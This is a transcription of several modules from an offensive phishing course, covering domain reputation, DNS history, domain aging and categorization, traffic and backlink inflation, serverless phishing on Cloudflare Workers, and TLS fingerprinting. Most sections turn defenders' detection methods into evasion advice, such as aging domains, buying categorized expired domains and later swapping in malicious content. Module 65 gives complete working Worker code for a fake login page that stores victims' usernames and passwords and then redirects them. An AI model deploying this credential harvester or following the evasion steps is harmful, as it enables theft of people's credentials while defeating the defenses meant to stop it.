---
title: "Reputation & Fingerprinting"
---

# 06. Reputação de Domínio e TLS Fingerprinting

## WHOIS, Categorização e JARM: Como Defensores Enxergam Sua Infra

A reputação do domínio e o fingerprinting TLS são métodos usados por defensores para identificar infraestrutura phishing. Entender como sua infraestrutura é percebida — via WHOIS, histórico DNS, categorização, tráfego e fingerprints TLS (JARM, JA3, JA4) — é essencial para prolongar a vida útil de uma campanha.

Os módulos a seguir foram transcritos do curso MalDev Academy - Offensive Phishing Operations (Módulos 60-75).

---

# Módulo 60 — Análise de Reputação WHOIS

Módulo 60 — WHOIS Reputation Analysis

- # Módulo 60 — Análise de Reputação WHOIS

# Disclaimer

## Introduction
Domain registration is an important component of any phishing campaign, serving as the foundational step where a domain name is secured to host the campaign's content. Defenders can examine the information of Newly Registered Domains (NRDs) provided during the registration process as well as patterns and characteristics of the domain to proactively determine the likelihood of malicious intent. This proactive method of detection can result in a domain being considered suspicious or blocked prior to conducting any activity. The following data can be used by defenders for this method of detection:
Registration Details - Information provided at registration, such as email addresses, can be crucial for linking different domains to the same actor, especially if these details are reused across multiple suspicious registrations.

- Registration History - Information about whether a domain has been previously registered and dropped, and the history related to these events, can also be a predictor of malicious intent.

- Choice of Registrar - Monitoring which registrars are used for domain registrations can provide clues, as some may be preferred for their lax security policies or anonymity features.

- Nameserver - The use of the same nameserver among different domains can also help link domains to the same actor.

- Domain Naming Patterns - Analyzing the structure and lexical properties of domain names can reveal common tactics such as using misleadingly legitimate-sounding names or variations of popular brand names.

- Timing and Volume of Registrations - A high number of domains registered in a short period, especially if they share similar characteristics, can be a red flag for bulk phishing operations.

This module will explain the various methods that can be used by defenders to determine if newly registered domains will be malicious, prior to the malicious activity even starting. Note that this module is based on Palo Alto Network's article Detecting and Preventing Malicious Domains Proactively with DNS Security.

## Registration Details
During the process of domain registration, the domain purchaser is required to enter several details that will be listed in the public WHOIS database unless privacy options are purchased with the domain. These details typically include the registrant’s name, address, email address, and phone number. Failing to use WHOIS privacy protection options during domain registration is considered an opsec mistake as it allows defenders to gather and correlate information across domains, even if the provided details are fake.

For example, if we perform a WHOIS lookup for `td.com`, we can see the information provided by the domain owner during registration:

The listed information contains an email, `dnsadmin@tdbank.ca`, which can be used in a reverse WHOIS lookup to discover other domains registered by the same entity.

Palo Alto Networks explains in their article how they managed to use WHOIS information for early detection by noticing the registrant's name is associated with malicious domains.

C2 domain minorleage[.]top is an example illustrating the early detection advantage. The domain was registered on Nov. 13, 2020, and labeled as suspicious by our system. Its WHOIS record received a low reputation score because all domains registered by its registrant are confirmed malicious. Using other publicly available information, the historical malicious rate of its registrant state, “Moskow”, is 74%, and that of its registrar is 44%.

When WHOIS privacy options are purchased and enabled during domain registration, the registrant's information is replaced with the registrar's details in the WHOIS records. This makes it challenging for defenders to use the provided email address or other information for correlation.

## Registration History
Another indicator that affects the domain's reputation is the registration history, specifically, if the domain was previously used in malicious campaigns and frequent ownership changes. Before registering a domain, it's important to investigate whether it has been previously associated with malicious activities. Domains that use generic, popular terminology can be deceptive, making them attractive for phishing campaigns. For example, the domain `access-coinbase.com` might have been used in a phishing attack in 2022. Its generic nature could make it a target for future registration by different attackers.

Continuing with the `access-coinbase.com` example, let's analyze the WHOIS history of the domain using BigDomainData.com. At the time of lookup, the domain has 9 historical records available.

Notice the constant change of domain registrars along with the registrant information which impacts the reputation of the domain.

Compare the historical WHOIS information with legitimate domains such as `amazon.com` or `maldevacademy.com` which have more uniform and consistent information.

Therefore, when selecting domains for a phishing campaign, ensure that the WHOIS historical data is taken into account prior to registering and using the domain.

## Choice of Registrar
Selecting a domain registrar allows us the choice of opting for one that may be more lenient on abuse reports to prevent downtime on our campaign. However, this can put our domain at a higher risk of being blocked due to the registrar being selected. For example, searching for the name of a domain registrar commonly associated with malicious activities often reveals numerous user complaints about the registrar's inadequate response to abuse reports.

The Palo Alto Networks article also explains how the registrar's reputation is evaluated as part of their predictive way of detecting malicious NRDs:

Registrant information is redacted for privacy, while the registrar, conbin[.]com, has a history where 45.12% of Newly Registered Domains (NRDs) are classified as malicious.

To avoid having your domain flagged as suspicious or blocked, it is advisable to use a reputable domain registrar, even if it means accepting the risk of the domain being taken down in response to abuse reports.

## Nameserver
Nameservers listed in the WHOIS database provide valuable information that helps in tracking and connecting domains with similar infrastructure. Although the nameserver alone may not suffice to establish a definitive connection between domains, it can be used to corroborate patterns or relationships when combined with other indicators. In Palo Alto Network's article, it mentions the usage of the identical registrant, registrar, and nameserver information to group newly registered domains, allowing them to attain a higher number of domains labeled "will-be-malicious".

We can see this in action by analyzing the image below, which illustrates how the registration time, registrar, registrant information, and nameserver details are identical. Furthermore, the similarity in the domain names serves as an additional indicator, reinforcing the likelihood of a connection between the domains.

## Domain Naming Patterns
A domain name can serve as a key indicator of whether a newly registered domain may be intended for malicious activity. These domain names typically fall into two main categories:

- Deceptive Keywords to Mislead Users - Domains created with enticing or familiar keywords to trick users into interacting with the website. Examples include `access-coinbase.com`, `secure-login-o365-portal.org`, and typosquatted variations such as `face0ook.com`.

- Randomly Generated Domain Names - Domains created using Domain Generation Algorithms (DGAs), which produce seemingly random names. Examples include `hskaipx.xyz` and `si1que.com`. Additional examples include a base keyword with minor variations such as `domain11.com`, `domain22.com`, `domain33.com`.

To better understand how a domain name can be an indicator of future malicious activity, we can analyze a large dataset of malicious domains available in this GitHub repository. Download the `full-domains-aa.txt` file, which contains a comprehensive list of malicious domains, and open it in a text editor to search for specific keywords. Below is a summary of the number of domains containing each keyword:

- Support: 1,771 domains

- Secure: 1,610 domains

- Service: 2,214 domains

- Login: 1,376 domains

When it comes to randomly generated domains, there are various algorithms capable of analyzing a domain to determine if it consists of random alphanumeric characters. However, this topic falls outside the scope of this module.

### NRD Tracking
There are repositories that track newly registered domains such as dns-blocklists which provides a continuously updated list of newly registered domains.

## Timing and Volume of Registrations
Attackers often engage in mass domain registration for various purposes, such as aging domains or minimizing operational disruptions by quickly switching to a new domain when needed. These registrations are typically carried out in bulk through the same registrars and often share identical WHOIS information. When at least one domain from the batch is identified as malicious, the remaining domains may also be flagged as suspicious due to correlations in registration time and WHOIS data.

There are various WHOIS databases such as WhoisDataCenter that can be integrated into tools to detect suspicious mass domain registration.

Furthermore, the NRD cluster algorithm grouped 842 domains registered on the same day within the same hour serving this campaign. This abnormal registration behavior is also a strong indicator of questionable activities.

The diagram below from Spamhaus.org, shows registration dates of blacklisted `.top` domains.

Similar to Palo Alto Network's methodology of domain analysis, SpamHaus investigated the following data points for the domains:

- Creation dates

- Registrar

- Registrant (which was usually fake information).

Again, SpamHaus was able to demonstrate that cybercriminals repeatedly registered hundreds or thousands of domain names in a matter of minutes, proving again that the timing and volume of domain registrations can be successfully used to detect newly registered domains intended for malicious use.

## Conclusion
Domain registration is a critical and foundational step in any phishing campaign, providing the necessary infrastructure for the operation. However, this process also offers defenders valuable data to analyze, enabling them to block domains and even correlate them with other domains before they become malicious. Understanding the techniques defenders use to flag newly registered domains is essential for avoiding detection.

## Resources

- Detecting and Preventing Malicious Domains Proactively with DNS Security

- Weaponizing Domain Names: how bulk registration aids global spam campaigns

- PREDATOR - Proactive Recognition and Elimination of Domain Abuse at Time-Of-Registration

## Objectives
Perform WHOIS lookup on several websites and analyze the WHOIS data

Perform a reverse WHOIS lookup and find correlated domains

Compare the registration history of a malicious website with a reputable website

Optional: Try to correlate newly registered domains using their domain name, time of registration, and other domain characteristics


---

# Módulo 61 — Registros DNS Históricos

Módulo 61 — Historical DNS Records

# Disclaimer

## Introduction
Historical DNS records help defenders track domain and infrastructure usage over time. By analyzing past domain resolutions, they can identify patterns, link malicious campaigns, and attribute attacks to known threats. If an adversary reuses domains or hosting, defenders can correlate the activity and recognize connections. These records also aid in threat hunting by exposing changes in domain ownership, hosting shifts, or suspicious behavior that may indicate compromised infrastructure.

This was the case for a North Korean APT that reused their network infrastructure which lead to the discovery of their malware: By tracking and analyzing these reused infrastructure components, we identified the new CollectionRAT malware detailed in this report (Cisco Talos Intelligence).

## Reusing Domain Names
Reusing domain names is sometimes performed to save on costs of purchasing new domain names. This, however, comes at the cost of allowing defenders to view the entire history of your domain and allowing them to correlate specific patterns to you. For example, searching the historical DNS records of the malicious domain `rbc-login.com` provides us with a lot of historical DNS information.

The `A` records below show us the different hosting providers along with their IP addresses that the malicious website has been using. By analyzing these A records, defenders can identify the various hosting providers used by the domain over time. This information can reveal patterns, such as repeated use of certain hosting services. Additionally, the dates associated with the A records can help establish a timeline of the domain’s activity, indicating periods of heightened activity or changes in hosting infrastructure.

Next, the `NS` records show us their authoritative nameservers. By examining the historical NS records, defenders can determine which nameservers have been authoritative for the domain at various points in time. If a domain frequently changes its nameservers, it may indicate attempts to evade detection or disrupt investigations. Additionally, specific nameserver providers might be known for their association with malicious activities, providing further context for the defenders.

The `MX` records show us their mailing provider, potentially being used for sending out phishing emails. By analyzing these historical `MX` records, defenders can identify the email service providers that have been used by the domain. This can help in tracking the sources of phishing emails and understanding the infrastructure behind email-based attacks.

## Re-using Infrastructure
When domains are burned in an engagement, one might delete the DNS records of the affected domain and point a new domain to the same infrastructure. This approach may simplify the requirement of having to setup the infrastructure again, however, this approach has a flaw. If the original domain (Domain A) was identified as malicious, and it's replaced by another domain (Domain B) that points to the same infrastructure, then Domain B can also be considered malicious by association. This means that there's no need to scan Domain B to determine its nature as it's likely malicious. This is especially true if the domain was swapped within a short period of time.

## Subdomains
Historical subdomain information can reveal not only malicious intent but also previously targeted organizations. For instance, an attacker might create a subdomain like `company.domain.com`, where "company" is the name of the target organization. Later, they might target a new company and create `new-company.domain.com`. A defender analyzing these subdomains can identify the malicious nature of the domain and see that the attacker has targeted other organizations before.

Subdomains can also provide details about the phishing page without having to view the page itself. For example, if a subdomain is found to be `o365-login.domain.com`, it's safe to assume that it's an O365 phishing page. Attackers also use this technique to uncover organizational relationships. For example, in the image below the domain `o365support.com` has a subdomain named `boeing.o365support.com`, which likely indicates that Boeing is or was a customer at some point.

## Conclusion
Historical DNS records provide defenders with information about our operations that may uncover patterns of malicious activity, identify previously targeted organizations, and reveal associations between subdomains and phishing attempts. By analyzing these records, defenders can gain valuable insights into an attacker's campaign, allowing them to proactively mitigate potential threats.

## Objectives
Compare historical DNS records of a legitimate website and a malicious website

Look up historical and existing subdomains for various legitimate and malicious websites


---

# Módulo 62 — Melhorando Reputação do Domínio: Domain Aging Domain Aging

Módulo 62 — Improving Domain Reputation Domain Aging

# Disclaimer

# Módulo 62 — Melhorando Reputação do Domínio: Domain Aging: Domain Aging

## Introduction
One of the methods security solutions and defenders are able to detect malicious domains is through domain reputation analysis. Domain reputation analysis is a method where a domain is evaluated based on various factors to determine its trustworthiness and the potential risk it may pose. One of the commonly evaluated factors that serve as a key indicator distinguishing legitimate from phishing websites is domain age. Phishing domains are typically created and used for a short period, often just a few days, before being taken down. In contrast, legitimate domains usually have a longer lifespan, often existing for at least several months or years.

It's important to remember that building domain reputation is time-consuming and defenders and security vendors are aware that most phishing websites are quickly assembled without much attention to domain reputation and thus they are often able to quickly stop hastily made phishing websites. Offensive security professionals, however, need to balance the time spent on building domain reputation with the limited duration of their engagements. Due to these time constraints, they may not be able to implement every technique for enhancing domain reputation and will need to focus on a select few that can still be effective.

In this module, we'll explore how domain age impacts domain reputation and the ability to use trusted domains to circumvent domain aging requirements.

## Domain Reputation
As previously mentioned, domain reputation analysis has become a common part of every security solution that analyzes phishing email websites. For example, it's not uncommon for an email to be immediately rejected due to the sending domain having a poor reputation. Therefore, we need to ensure that our domain has a decent reputation to increase our chances of success.

## Domain Age Comparison
One of the main factors that determines the domain's reputation is the domain age. The domain age can be revealed when performing a WHOIS lookup which can be done using various tools like DomainTools - WHOIS Lookup. We'll compare the domain age of a legitimate website with that of a phishing website. The image below shows the domain age of `nike.com`, is over 10,000 days old.

Compare Nike's domain age with the following malicious domain's age, which is only 6 days old.

This is not an anomaly, below we can see two additional malicious domains which are aged 3 days and 2 days, respectively.

## Domain Aging
Another strategy used by attackers is to purchase domains early and allow them to age before using them, commonly described as Domain Aging. As described in Palo Alto's article, attackers involved in the SolarWinds breach bought their domains years in advance. Therefore, it is advisable to purchase a set of generically named domains that can be used against any future targets, ensuring they have aged appropriately by the time they are needed.

### Website Traffic Trends
A caveat with this strategy is that some security solutions take into consideration the website traffic with the domain age. A typical phishing website will have little to no activity until the campaign begins, at which point the activity on the website spikes for a short period. This is illustrated in the diagram below.

When this is performed on an aged domain that was purchased a year ago, the pattern becomes more evident. This web traffic pattern was also mentioned in the previous Palo Alto article and how the pattern may be used for detection purposes.

Malicious dormant domains will present abnormally sudden traffic increments when they are involved in active campaigns. Therefore, we launched a cloud-based detector to monitor domains' activities and identify these strategically aged domains. It extracted about 30,000 domains every day from fine-grained passive domain name system (DNS) data. These domains typically have limited traffic for months to years and then gain more than 10.3 times the traffic increment within one day. Their malicious rate is more than three times higher than that of newly registered domains (NRDs). And 22.27% of them are malicious, suspicious, or not safe for work.

An example of a dormant website that launches a phishing campaign after a few months of being registered is illustrated below.

The upcoming modules, Improving Domain Reputation: Domain Categorization and Improving Domain Reputation: Web Traffic will explain additional methods to use with your aged domain for increased legitimacy and domain reputation.

## Trusted Domains
Although this was mentioned in a previous module, it is worth reiterating as it relates to domain aging. Using a trusted website to host your phishing content bypasses the domain aging requirement. This is because service providers often offer subdomains on legitimate domains they own (e.g. `https://phishing-bucket.s3.amazonaws.com`), effectively skipping the need to age your domain. However, while this can help with the domain aging aspect, some organizations may consider all links from certain providers to be suspicious due to frequent abuse, resulting in this technique to be less useful than desired.

## Objectives
Find malicious domains on urlscan.io and look up their domain age

Find one or more dormant domains that might be domain aging (Hint: look for suspicious domain names)


---

# Módulo 63 — Melhorando Reputação do Domínio: Categorização Domain Categorization

Módulo 63 — Improving Domain Reputation Domain Categorization

- # Módulo 63 — Melhorando Reputação do Domínio: Categorização Domain Categorization

# Disclaimer
# Módulo 63 — Melhorando Reputação do Domínio: Categorização: Domain Categorization

## Introduction
The next domain reputation factor we'll discuss in this module is domain categorization. Domain categorization involves classifying domains into various categories based on their content, purpose, and behavior. This classification helps determine the legitimacy and potential risk of a domain. Security solutions and web filters use domain categorization to identify malicious domains, enhance web filtering by enforcing acceptable use policies, and block access to inappropriate or harmful sites.If a domain was purchased a year ago and then phishing content was setup on it today, it would be considered an aged domain with a better reputation. However, because the website had no content for the whole year, it is likely to be uncategorized by the majority of security solutions, and thus it faces additional scrutiny. Uncategorized domains are subject to more intense analysis since they have not yet been thoroughly analyzed to determine their category. This unwanted attention may lead to the detection of your website and its categorization as a phishing site.In this module, we'll provide multiple strategies to categorizing domains prior to launching a phishing campaign.
## Expired Domains
The easiest way to receive a categorized domain is to purchase an expired domain that was already categorized. The process of selecting the domain should be thorough to avoid picking an expired domain that had any malicious elements. Additionally, the longer the domain was running with legitimate content, the better candidate that it is.
### Finding An Expired Domain
Here is an example of picking a categorized expired domain using Expireddomains.net. Start by having an idea of the type of domain to get, including the TLD and the keywords in the domain name, and filter for these keywords.In our example, we've selected `.com` domains with the keyword "tech" in the domain name.In order to select the ideal domain, we need to explain the meaning of the important columns:LE - The number of characters in the domain name. The ideal domain name should have less than 25 characters.BL - The number of Majestic external backlinks. Backlinks will be covered in more detail in the next module. Backlinks represent the number of external domains that link this domain. A higher number of backlinks is usually better and indicative of a more legitimate domain.DP - The number of backlinks from different domains. Again, the higher the number, the better.WBY - The year the domain was created, as provided by a WHOIS lookup.ABY - The year the domain was first seen on `Archive.org`.ACR - The number of crawls found by `Archive.org`.MMGR - Majestic million global rank. This is a metric of the top million domains based on the number of links that point back to it.C,N,O,B,I,D - The availability of the same domain name with different TLDs such as `.com`, `.net`, `.org`, `.biz`, `.info`, and `.de`.Status - Indicates whether the domain is available for registering.Let's sort the domains with the highest number of backlinks as these domains will often have had more traction and therefore are likely categorized and appear more legitimate.
### Categorization Check
Once a domain has been selected, we should begin analyzing the domain's reputation. There are several tools to check for domain reputation and categorization which are shown below.
Note: Some of the services listed below allow us to submit a request for categorization. This should be done, when possible, to speed up the process of categorization.

Cisco Talos Intelligence

- Palo Alto Networks

- Trend Micro

- URLVoid

- BrightCloud

- IBM xForce

- Bluecoat

- Cyren URL Check

- ZVelo

The domain we selected is categorized but has a poor web reputation. Ideally, the reputation should be at least neutral. These two scenarios are shown in the images below.

### Further Analysis
It's always a good habit to check the website with VirusTotal and `Archive.org` to understand what the website previously hosted and to see what defenders might observe when investigating your website.

## Manual Categorization
Alternatively, if you have a registered domain you can have it categorized by hosting content with specific keywords in it. Note that this process may be time-consuming and slow. You can create your own website templates or use existing templates available in places such as:

- HTML5Up

- Free CSS

- More resources here

In this example, a template from Free CSS will be downloaded onto the server to allow internet scanners to categorize the website. It's possible to use the cheapest server to host the content to minimize costs.

Start by selecting the template to host, keeping in mind that the website's categorization will be based on the content used.

Next, download and unzip the content, ensuring it is hosted in the root directory of the website. Ideally, the dummy content should be replaced with real text prior to hosting the content.

Check the website to confirm the content is successfully hosted.

Once the website is categorized, replace some or all of the benign content with malicious content. Alternatively, host the malicious content on a specific path (e.g. `/login/console`) which can then be shared with your target users.

## Conclusion
Modern phishing websites achieve better results with categorized domains, as uncategorized ones are more likely to be scrutinized and potentially blocked. Investing time in making the website appear more legitimate prior to launching the phishing campaign will yield better results in the long run.

## Objectives
Get your domain categorized by at least one vendor by submitting a request

Find a benign and categorized expired domain


---

# Módulo 64 — Melhorando Reputação do Domínio: Tráfego Web Web Traffic

Módulo 64 — Improving Domain Reputation Web Traffic

- # Módulo 64 — Melhorando Reputação do Domínio: Tráfego Web Web Traffic

# Disclaimer
# Módulo 64 — Melhorando Reputação do Domínio: Tráfego Web: Web Traffic

## Introduction
This module continues our series on building and enhancing domain reputation, a crucial element for running a successful phishing campaign. In this module, we discuss additional factors that can be used to improve the domain's reputation such as web traffic, backlinks, and trusted links. These factors can be used by URL analyzers and other security solutions to determine whether a website is suspicious or benign.
## Web Traffic
As previously mentioned in our series on improving domain reputation, one common indicator of a malicious website is a low volume of web traffic. Websites with little web traffic may be considered untrustworthy and thus face additional scrutiny by security solutions or in some cases completely blocked. Web traffic analysis solutions such as SimilarWeb and SemRush can provide information on a domain's web traffic. For example, in the two images below we compare `Microsoft.com`'s web traffic with `onlineloginportal.com`, which is a phishing website.Note that `onlineloginportal.com` has been aged and performing a WHOIS lookup on the website reveals that it's over 1000 days old. Thus, there is no direct correlation between domain age and web traffic; a website can be thousands of days old and still have no traffic.
### Increasing Web Traffic
Quickly gaining web traffic is challenging, which is why assessing a website's traffic often serves as a good indicator of its trustworthiness. With that being said, there are two main methods of quickly increasing web traffic:
Social Media Ads: - Host legitimate content on your website and make use of social media ads to boost web traffic. By leveraging ads, this method accelerates the process of driving visitors to the site. Once the website has proven web traffic, add the malicious content to your website.

- Buying Web Traffic - There are various online services that claim to offer the option of purchasing fake web traffic. This method should be approached with caution, as it can lead to poor-quality traffic and harm the website’s reputation.

## Backlinks
Backlinks are incoming links from other websites that point to your website and they are commonly associated with search engine rankings. Essentially, backlinks indicate how many external websites are linking to yours. Security solutions may analyze backlinks to gauge the trustworthiness of your site; a high number of quality backlinks suggests that the website is trustworthy. There are several websites that provide insight into a domain's backlinks such as neilpatel.com.

In the example below, we check `mrd0x.com` to determine how many total backlinks and unique domains point to the domain. By simply looking at these numbers and without visiting the website, it's fair to assume that the website is legitimate and receives frequent web traffic.

Similarly to increasing web traffic on a website, increasing the number of backlinks can be challenging, but several options are available. One method is buying backlinks from online services that claim to improve a website’s SEO, although caution is advised when pursuing this approach.

Another option involves purchasing domains, adding legitimate content, and linking the malicious domain on those websites; however, this strategy may be less effective if the purchased domains have a poor reputation.

A final method uses cloud services to host content linking to the malicious domain. For example, registering an Azure Web App (such as `example.azurewebsites.net`) and adding legitimate content that includes a link to the malicious domain can provide a backlink from a trusted site like `azurewebsites.net`.

## Embedding Trusted Links
URL scanners evaluate various aspects of a website, including the extraction and analysis of embedded links. A typical website will likely include several legitimate links to sites like GitHub, Facebook, and X. In contrast, a phishing website may feature only a form and a submit button with few, if any, additional links. To potentially enhance a domain's reputation against URL scanners, one strategy is to embed links to trusted websites.

Analysis and sandbox tools often generate graph diagrams to illustrate a website's activities and communication patterns. By embedding benign links, these diagrams can be cluttered with connections to reputable websites, making it more challenging to identify malicious behavior.

## Objectives
Host legitimate content on your website using an online free HTML template

Embed trusted links into your website

Add Search Engine Optimization (SEO) to your website

Find additional ways to increase web traffic

Optional: register your website in the Google Search Console (search.google.com/search-console) and Bing Webmasters Tool (www.bing.com/webmasters/about). This process requires domain verification


---

# Módulo 65 — Phishing Serverless: Cloudflare Workers Cloudflare Worker

Módulo 65 — Serverless Phishing Cloudflare Worker

# Disclaimer

# Módulo 65 — Phishing Serverless: Cloudflare Workers: Cloudflare Worker

## Introduction
This module will go through the deployment of serverless phishing infrastructure using Cloudflare Workers. Cloudflare Workers are lightweight, serverless functions that run at the edge of Cloudflare's global network, allowing developers to execute code without managing traditional servers. By deploying with Cloudflare Workers, you’ll receive a unique `*.workers.dev` subdomain along with an SSL certificate.

This module requires you to have a Cloudflare account. If you do not already have one, create one here.

## Creating a Cloudflare Worker
To create a Cloudflare Worker that displays "Hello World", follow these steps in the Cloudflare dashboard:

First, navigate to "Compute (Workers)" in the Cloudflare dashboard. Then, select "Workers & Pages" from the submenu. Finally, click "Create Worker" to start a new project.

A randomly generated name will be assigned to your Worker which can be modified.

Click "Deploy" to publish your Worker. The Worker is now accessible via the specified `*.workers.dev` subdomain that was previously selected.

## Categorization
One benefit of using Cloudflare Workers is some vendors have already categorized the domain for us. For example, Sophos and ForcePoint have categorized our domain as "Information Technology". This saves us time and effort from having to do manual categorization.

## Editing The Worker's Code
As previously mentioned, by default the Worker has code that displays "Hello World". To modify the code, navigate to your Worker's settings under the "Deployments" tab. Then, click the code editor icon in the top-right corner to open the inline editor, allowing you to make and deploy changes directly.

Once inside the editor, paste the script below, which displays a sample login page, and then click "Deploy" in the top-right corner to save and publish your changes.

```
export default {
  async fetch(request, env, ctx) {
    const htmlContent = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <title>Sample Login Page</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
          h1 { color: #007bff; }
          form { display: inline-block; text-align: left; margin-top: 20px; }
          input { display: block; margin-bottom: 10px; padding: 8px; width: 200px; }
          button { padding: 10px; background-color: #007bff; color: white; border: none; cursor: pointer; }
          button:hover { background-color: #0056b3; }
        </style>
      </head>
      <body>
        <h1>Sample Login Page</h1>
        <form method="POST">
          <label>Username:</label>
          <input type="text" name="username" required>
          <label>Password:</label>
          <input type="password" name="password" required>
          <button type="submit">Submit</button>
        </form>
      </body>
      </html>
    `;

    return new Response(htmlContent, {
      headers: { "Content-Type": "text/html" },
    });
  },
};

```

## Cloudflare KV (Key-Value) Storage
The previously shown code displays an HTML sample login page that does not have any added functionality. Once the credentials are stored, we need a persistent storage method to keep the credentials. In this section, we will demonstrate the usage of Cloudflare Key-Value (KV) Storage to store the submitted credentials. Follow the steps below to setup and use Cloudflare KV Storage.

Navigate to "Storage & Databases" in the Cloudflare dashboard, click "KV" and then "Create".

Create a namespace called "creds".

Navigate to your Worker and click the "Settings" tab. Under the "Bindings" option click "Add".

When the different binding options are presented, select "KV Namespace".

Enter the variable name "creds" and select the "creds" namespace.

With these steps completed, we can now use the `env.creds.put` function to store data in our KV storage.

### Updated Worker Code
With KV storage successfully setup, we will integrate functionality to store the credentials. The code below extracts the username and password from the HTML form, uses the `env.creds.put` function to place the username and password into the KV storage and upon success, it redirects to `google.com`.

```
if (request.method === "POST") {
  const formData = await request.formData();
  const username = formData.get("username");
  const password = formData.get("password");

  if (username && password) {
    await env.creds.put(username, password);

    return new Response(null, {
      status: 303,
      headers: { "Location": "https://www.google.com" }
    });
  } else {
    return new Response("Missing username or password", { status: 400 });
  }
}

```
The complete Worker code is shown below.

```
export default {
  async fetch(request, env) {
    if (request.method === "POST") {
      const formData = await request.formData();
      const username = formData.get("username");
      const password = formData.get("password");

      if (username && password) {
        await env.creds.put(username, password);

        return new Response(null, {
          status: 303,
          headers: { "Location": "https://www.google.com" }
        });
      } else {
        return new Response("Missing username or password", { status: 400 });
      }
    }

    const htmlContent = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <title>Sample Login Page</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
          h1 { color: #007bff; }
          form { display: inline-block; text-align: left; margin-top: 20px; }
          input { display: block; margin-bottom: 10px; padding: 8px; width: 200px; }
          button { padding: 10px; background-color: #007bff; color: white; border: none; cursor: pointer; }
          button:hover { background-color: #0056b3; }
        </style>
      </head>
      <body>
        <h1>Sample Login Page</h1>
        <form method="POST">
          <label>Username:</label>
          <input type="text" name="username" required>
          <label>Password:</label>
          <input type="password" name="password" required>
          <button type="submit">Submit</button>
        </form>
      </body>
      </html>
    `;

    return new Response(htmlContent, {
      headers: { "Content-Type": "text/html" },
    });
  },
};

```
The stored results can be found in Storage & Databases > KV > KV Pairs.

## Cloudflare D1 SQL Storage
Another persistent storage method to store the credentials is D1 SQL Storage. In this section, we will demonstrate the usage of D1 SQL Storage to store the submitted credentials. The steps will be similar to that of the KV storage method.

Navigate to "Storage & Databases" in the Cloudflare dashboard and click "D1 SQL Database" and then "Create".

Create a database called "main".

Next, create a table called `creds` with three columns, `username`, `password`, and `submission_time`.

Navigate to your Worker and click the "Settings" tab. Under the "Bindings" option click "Add".

When the different binding options are presented, select "D1 Database".

Enter the variable name "main" and select the "main" database.

With these steps completed, we can now use SQL queries to store data in our `creds` table.

### Updated Worker Code
With database storage successfully setup, we will integrate the functionality to store the credentials. The code below extracts the username and password from the HTML form, retrieves the current date and time, and then uses a prepared SQL statement to place the data into the `creds` table. Finally, upon success, it redirects the client to `google.com`. The lines below construct and execute an SQL query to store user credentials in the Cloudflare D1 database.

```
// Prepare SQL statement to insert data
const query = `INSERT INTO creds (username, password, submission_time) VALUES (?, ?, ?)`;

// Execute SQL query
await env.main.prepare(query).bind(username, password, submissionTime).run();

```
The complete Worker code is shown below.

```
export default {
  async fetch(request, env) {
    if (request.method === "POST") {
      const formData = await request.formData();
      const username = formData.get("username");
      const password = formData.get("password");
      const submissionTime = new Date().toLocaleString("en-US", { timeZone: "America/New_York" });
  
      if (username && password) {
        const query = `INSERT INTO creds (username, password, submission_time) VALUES (?, ?, ?)`;
        try {
          await env.main.prepare(query).bind(username, password, submissionTime).run();

          return new Response(null, {
            status: 303,
            headers: { "Location": "https://www.google.com" }
          });
        } catch (error) {
          return new Response("Database error", { status: 500 });
        }
      } else {
        return new Response("Missing username or password", { status: 400 });
      }
    }

    const htmlContent = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <title>Sample Login Page</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
          h1 { color: #007bff; }
          form { display: inline-block; text-align: left; margin-top: 20px; }
          input { display: block; margin-bottom: 10px; padding: 8px; width: 200px; }
          button { padding: 10px; background-color: #007bff; color: white; border: none; cursor: pointer; }
          button:hover { background-color: #0056b3; }
        </style>
      </head>
      <body>
        <h1>Sample Login Page</h1>
        <form method="POST">
          <label>Username:</label>
          <input type="text" name="username" required>
          <label>Password:</label>
          <input type="password" name="password" required>
          <button type="submit">Submit</button>
        </form>
      </body>
      </html>
    `;

    return new Response(htmlContent, {
      headers: { "Content-Type": "text/html" },
    });
  },
};

```
The stored results can be found in Storage & Databases > D1 SQL Database > Tables > creds.

## Conclusion
Serverless infrastructure offers a convenient way to deploy phishing websites, as they come pre-configured with a subdomain and an SSL certificate. However, this convenience comes at the cost of flexibility, as you have limited control over server configurations, networking settings, and custom backend functionality. Additionally, platforms that offer serverless services may implement security measures that can detect and mitigate phishing websites which should be taken into consideration prior to using them.

## Objectives
Use Cloudflare Workers to deploy a sample phishing website

Use a different cloud service provider's serverless solution to deploy a sample phishing website

Scan your Cloudflare Worker link using various online services and analyze the results


---

# Módulo 66 — JARM Fingerprinting

Módulo 66 — JARM Fingerprinting

- # Módulo 66 — JARM Fingerprinting

# Disclaimer

## Introduction
Defenders and security providers are frequently engaged in the task of developing unique fingerprints for tools and applications commonly leveraged by attackers. These fingerprints expedite the identification and mitigation of threats, causing frustration for attackers and leading to the depletion of their resources. The complexity of creating these fingerprints can vary significantly. In some cases, it may be as simple as recognizing a unique combination of HTTP headers and their specific order within a server’s response. In other scenarios, the process becomes more elaborate, requiring the integration of multiple variables to generate a distinct fingerprint. For example, the combination of open ports, HTTP response codes, and other network characteristics might be used to create a fingerprint that accurately distinguishes a specific malicious tool or server.One fingerprinting method is JARM, which generates a fingerprint based on the TLS configuration of a server by analyzing the responses to several specifically crafted TLS `ClientHello` packets. In this module, we will explore how defenders perform JARM fingerprinting and discuss techniques for modifying server configurations to evade detection through JARM.
## Establishing A TLS Connection
To fully grasp how JARM operates, it's essential to first understand the process of establishing a TLS connection. There are many in-depth explanations available on the TLS handshake, such as Cloudflare's detailed guide. However, we will only be focusing on the aspects relevant to understanding JARM.A TLS handshake occurs when a client accesses a website over HTTPS, specifically after a TCP connection has been established through a TCP handshake. The diagram below, sourced from exoprise.com, illustrates this process. In the diagram, the blue portions represent the TCP handshake, while the green portions represent the TLS handshake.The TCP and TLS handshakes are also visible in Wireshark, with packets 5 to 7 representing the TCP handshake, and packets 8 to 22 capturing the TLS handshake process:
### TLS Handshake Breakdown
We'll filter out the TCP packets to only show the TLS handshake and explain the handshake in relation to the packets.
ClientHello (Packet 8) - The client initiates the handshake by sending a `ClientHello` message to the server, which includes information such as the supported TLS versions, cipher suites, compression methods, and other relevant data.

